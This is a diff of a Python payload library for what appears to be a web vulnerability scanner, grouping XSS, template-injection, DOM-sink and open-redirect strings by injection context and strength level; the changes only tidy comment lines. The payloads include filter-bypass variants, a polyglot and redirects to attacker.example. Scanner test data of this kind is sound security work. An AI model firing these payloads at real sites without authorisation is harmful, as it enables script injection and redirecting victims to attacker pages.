@@ -18,7 +18,7 @@ from typing import Dict, List
 
 Payload = Dict[str, str]
 
-# ── 강도 제한 ──────────────────────────────────────────────────────────────────
+#  강도 제한 
 STRENGTH_LIMIT = {
     "LOW":    4,
     "MEDIUM": 10,
@@ -26,7 +26,7 @@ STRENGTH_LIMIT = {
     "INSANE": 9999,
 }
 
-# ── 1. ATTR_VALUE — value="" / name="" 속성 탈출 ──────────────────────────────
+#  1. ATTR_VALUE — value="" / name="" 속성 탈출 
 # " 또는 '로 속성을 닫고 이벤트 핸들러 / 새 태그 삽입
 ATTR_VALUE: List[Payload] = [
     # --- 이중 따옴표 탈출
@@ -55,7 +55,7 @@ ATTR_VALUE: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "inline_alert_sq",     "payload": "';alert(1);//"},
 ]
 
-# ── 2. ATTR_HREF — URL 속성 (href/src/action/formaction) ──────────────────────
+#  2. ATTR_HREF — URL 속성 (href/src/action/formaction) 
 ATTR_HREF: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "js_protocol",         "payload": "javascript:alert(1)"},
     {"type": "REFLECTED_XSS", "family": "js_protocol_caps",    "payload": "JavaScript:alert(1)"},
@@ -69,7 +69,7 @@ ATTR_HREF: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "attr_break_onfocus",  "payload": '" onfocus=alert(1) href="#'},
 ]
 
-# ── 3. ATTR_EVENT — 기존 이벤트 속성 내부 탈출 ──────────────────────────────────
+#  3. ATTR_EVENT — 기존 이벤트 속성 내부 탈출 
 # onclick="USER_INPUT" 같은 구조
 ATTR_EVENT: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "ev_dq_break",         "payload": '";alert(1);//'},
@@ -80,7 +80,7 @@ ATTR_EVENT: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "ev_dq_onerror_img",   "payload": '"><img src=x onerror=alert(1)>'},
 ]
 
-# ── 4. SCRIPT — <script> 블록 내 JS 문자열 탈출 ────────────────────────────────
+#  4. SCRIPT — <script> 블록 내 JS 문자열 탈출 
 SCRIPT_CONTEXT: List[Payload] = [
     # 문자열 닫기 + 명령 삽입
     {"type": "REFLECTED_XSS", "family": "sc_dq_break",          "payload": '";alert(1);//'},
@@ -97,7 +97,7 @@ SCRIPT_CONTEXT: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "sc_throw_onerror",     "payload": "';throw/**/onerror=alert,1;//"},
 ]
 
-# ── 5. SCRIPT_RAW — <script> 내부 직접 삽입 (문자열 컨텍스트 없음) ───────────────
+#  5. SCRIPT_RAW — <script> 내부 직접 삽입 (문자열 컨텍스트 없음) 
 SCRIPT_RAW: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "raw_alert",            "payload": "alert(1)"},
     {"type": "REFLECTED_XSS", "family": "raw_eval_encoded",     "payload": "eval('\\x61lert\\x281\\x29')"},
@@ -108,7 +108,7 @@ SCRIPT_RAW: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "raw_document_write",   "payload": "document.write('<script>alert(1)<\\/script>')"},
 ]
 
-# ── 6. HTML_COMMENT — <!-- USER --> 주석 탈출 ────────────────────────────────
+#  6. HTML_COMMENT — <!-- USER --> 주석 탈출 
 HTML_COMMENT: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "cmt_img",              "payload": "--><img src=x onerror=alert(1)><!--"},
     {"type": "REFLECTED_XSS", "family": "cmt_svg",              "payload": "--><svg onload=alert(1)><!--"},
@@ -116,7 +116,7 @@ HTML_COMMENT: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "cmt_ie_cond",          "payload": "--><![if]><img src=x onerror=alert(1)><!-->"},
 ]
 
-# ── 7. BODY — HTML body 직접 삽입 (필터 없거나 약한 경우) ────────────────────────
+#  7. BODY — HTML body 직접 삽입 (필터 없거나 약한 경우) 
 BODY: List[Payload] = [
     # img
     {"type": "REFLECTED_XSS", "family": "img_onerror",          "payload": "<img src=x onerror=alert(1)>"},
@@ -157,7 +157,7 @@ BODY: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "form_action_js",       "payload": "<form action=javascript:alert(1)><input type=submit>"},
 ]
 
-# ── 8. CSS — style 속성 / <style> 블록 ──────────────────────────────────────────
+#  8. CSS — style 속성 / <style> 블록 
 CSS: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "css_expr_ie",          "payload": '<style>*{x:expression(alert(1))}</style>'},
     {"type": "REFLECTED_XSS", "family": "css_import_js",        "payload": "@import 'javascript:alert(1)';"},
@@ -167,7 +167,7 @@ CSS: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "css_moz_binding",      "payload": "-moz-binding:url(data:text/xml,<bindings><binding id='xss'><handler event='mouseover'><![CDATA[alert(1)]]></handler></binding></bindings>#xss)"},
 ]
 
-# ── 9. JSON — JSON 응답값이 DOM에 반영되는 경우 ──────────────────────────────────
+#  9. JSON — JSON 응답값이 DOM에 반영되는 경우 
 JSON_CONTEXT: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "json_dq_close",        "payload": '","<script>alert(1)</script>":"'},
     {"type": "REFLECTED_XSS", "family": "json_script_tag",      "payload": "</script><script>alert(1)</script>"},
@@ -175,7 +175,7 @@ JSON_CONTEXT: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "json_html_entity",     "payload": "&lt;script&gt;alert(1)&lt;/script&gt;"},
 ]
 
-# ── 10. TEMPLATE — 서버사이드 템플릿/클라이언트 템플릿 표현식 ────────────────────────
+#  10. TEMPLATE — 서버사이드 템플릿/클라이언트 템플릿 표현식 
 TEMPLATE: List[Payload] = [
     # Angular / AngularJS
     {"type": "REFLECTED_XSS", "family": "ng_expression",        "payload": "{{constructor.constructor('alert(1)')()}}"},
@@ -192,7 +192,7 @@ TEMPLATE: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "jinja2_xss",           "payload": "{{''.__class__.__mro__[1].__subclasses__()}}"},
 ]
 
-# ── 11. FILTER_BYPASS — 필터 우회 기법 ──────────────────────────────────────────
+#  11. FILTER_BYPASS — 필터 우회 기법 
 FILTER_BYPASS: List[Payload] = [
     # 대소문자 혼합
     {"type": "REFLECTED_XSS", "family": "mixed_case_img",       "payload": "<ImG sRc=x OnErRoR=alert(1)>"},
@@ -231,7 +231,7 @@ FILTER_BYPASS: List[Payload] = [
     {"type": "REFLECTED_XSS", "family": "onanimationstart",     "payload": '<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart=alert(1)>'},
 ]
 
-# ── 12. STORED — Stored XSS 특화 (저장용 페이로드) ────────────────────────────────
+#  12. STORED — Stored XSS 특화 (저장용 페이로드) 
 STORED: List[Payload] = [
     # 기본 script 삽입 (게시판 본문/제목/닉네임 등)
     {"type": "STORED_XSS",    "family": "st_script_basic",      "payload": "<script>alert(document.domain)</script>"},
@@ -253,7 +253,7 @@ STORED: List[Payload] = [
     {"type": "STORED_XSS",    "family": "st_polyglot",          "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"},
 ]
 
-# ── 13. OPEN_REDIRECT — 리다이렉트 파라미터 ──────────────────────────────────────
+#  13. OPEN_REDIRECT — 리다이렉트 파라미터 
 OPEN_REDIRECT: List[Payload] = [
     {"type": "OPEN_REDIRECT", "family": "external_http",        "payload": "https://attacker.example/"},
     {"type": "OPEN_REDIRECT", "family": "external_proto_rel",   "payload": "//attacker.example/"},
@@ -263,7 +263,7 @@ OPEN_REDIRECT: List[Payload] = [
     {"type": "OPEN_REDIRECT", "family": "triple_slash",         "payload": "///attacker.example/"},
 ]
 
-# ── 14. DOM_SINK — DOM 기반 소스→싱크 흐름 테스트용 ──────────────────────────────
+#  14. DOM_SINK — DOM 기반 소스→싱크 흐름 테스트용 
 DOM_SINK: List[Payload] = [
     # location.hash / URL fragment
     {"type": "DOM_XSS",       "family": "hash_img",             "payload": "#<img src=x onerror=alert(1)>"},
@@ -279,7 +279,7 @@ DOM_SINK: List[Payload] = [
 ]
 
 
-# ── 헬퍼 ──────────────────────────────────────────────────────────────────────
+#  헬퍼 
 
 def _limit(payloads: List[Payload], strength: str) -> List[Payload]:
     """강도별 페이로드 수 제한"""
@@ -299,7 +299,7 @@ def _dedupe(groups: List[List[Payload]]) -> List[Payload]:
     return result
 
 
-# ── context별 payload 매핑 ────────────────────────────────────────────────────
+#  context별 payload 매핑 
 CONTEXT_MAP: Dict[str, List[Payload]] = {
     "attr_value":    ATTR_VALUE,
     "attr_href":     ATTR_HREF,
